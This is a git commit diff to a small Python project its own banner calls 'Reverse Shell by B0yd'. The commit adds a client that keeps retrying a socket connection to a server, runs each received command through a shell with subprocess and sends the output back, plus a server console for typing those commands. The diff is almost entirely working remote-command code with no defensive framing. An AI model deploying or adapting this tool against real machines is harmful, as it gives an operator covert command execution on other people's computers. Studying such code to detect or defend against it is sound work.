b984a60548ef4f9ac80ef92abddc670ee5fd2ceb
Boyd <boydpires@gmail.com>
2021-01-13 18:53:01 +0530

    Add method to process shell commands

--- client.py
+++ client.py
@@ -1,13 +1,69 @@
 import socket
+import time
+import os
+import subprocess
+import platform
+import psutil
 
-HOST = socket.gethostbyname(socket.gethostname()) 
-PORT = 12345 
+OS = platform.system()
+HOST = socket.gethostbyname(socket.gethostname())
+PORT = 12345
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((HOST, PORT))
 
+# noinspection SpellCheckingInspection
+def handle_conn():
+    print("[Connection established]")
+    while True:
+        try:
+            data_length = sock.recv(50).decode('utf-8')
+            cmd = sock.recv(int(data_length)).decode('utf-8')
+            if cmd == 'os.getcwd()':
+                sock.send(get_cwd().encode('utf-8'))
+            else:
+                sock.send(process_cmd(cmd).encode('utf-8'))
+        except:
+            sock.close()
+            break
+
+
+def get_cwd():
+    return str(os.getcwd()) + '> '
+
+
+# def kill(proc_pid):
+#     process = psutil.Process(proc_pid)
+#     for proc in process.children(recursive=True):
+#         proc.kill()
+#     process.kill()
+
+
+def process_cmd(cmd):
+    if len(cmd) > 0:
+        proc = subprocess.Popen(cmd[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        # kill(proc.pid)
+        output = proc.stdout.read() + proc.stderr.read()
+        output = output.decode('utf-8')
+        return output
+    elif cmd[:2] == 'cd':
+        os.chdir(cmd[3:])
+        return ''
+    return 'Received NULL command'
+
+
+# Brute force connection to the server
+secs = 0
 while True:
-    data_length = sock.recv(50).decode('utf-8')
-    data = sock.recv(int(data_length)).decode('utf-8')
-    print(data)
-    sock.send('send Ack'.encode('utf-8'))
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((HOST, PORT))
+        handle_conn()
+        time.sleep(5)
+        secs = 0
+    except:
+        if OS == 'Windows':
+            os.system('cls')
+        else:
+            os.system('clear')
+
+        secs += 1
+        print(f"Trying to reach the server [{secs} elapsed]")
--- server.py
+++ server.py
@@ -4,6 +4,7 @@ HOST = socket.gethostbyname(socket.gethostname())
 PORT = 12345 
 sock = None
 
+
 def init_socket():
     try:
         global sock
@@ -18,20 +19,26 @@ def init_socket():
     except socket.error as err:
         print(f"[ERROR] Unable to initialize socket \nverbose: {err}")
 
-def accept_conn():
-    print('Reverse Shell by B0yd\n')
-    print('?: help\n')
-    print('Reverse connections will appear here')
-    conn, addr = sock.accept()
-    print(f"Connected to {addr[0]}:{addr[1]}")
-    handle_client(conn, addr)
 
-def handle_client(conn, addr):
+def accept_conn():
+    conn, address = sock.accept()
+    print("Reverse connection will appear here")
+    print(f"Connected to {address[0]}:{address[1]}")
+    handle_client(conn, address)
+
+
+def handle_client(conn, address):
     while True:
-        cmd = input('> ')
+        conn.send(str(len('os.getcwd()')).encode('utf-8'))
+        conn.send('os.getcwd()'.encode('utf-8'))
+        print(conn.recv(2048).decode('utf-8'), end='')
+        cmd = input()
         if cmd == '?':
-            help()
+            help_menu()
         elif cmd == 'exit' or cmd == 'quit':
+            cmd_length = len(cmd)
+            conn.send(str(cmd_length).encode('utf-8'))
+            conn.send(cmd.encode('utf-8'))
             conn.close()
             break
         else:
@@ -39,15 +46,17 @@ def handle_client(conn, addr):
             conn.send(str(cmd_length).encode('utf-8'))
             conn.send(cmd.encode('utf-8'))
             data = conn.recv(1024)
-            print(data.decode('utf-8'))
+            if data != '':
+                print(data.decode('utf-8'))
 
 
-def help():
+def help_menu():
     print("""Help Menu 
     \nAll kinds of system shell commands are supported based on the OS connected to
     \nto quit type 'quit' or 'exit'""")
 
 
+print("Reverse Shell by B0yd\n")
+print("?: help\n")
 print("Server is starting...")
 init_socket()
-sock.close()
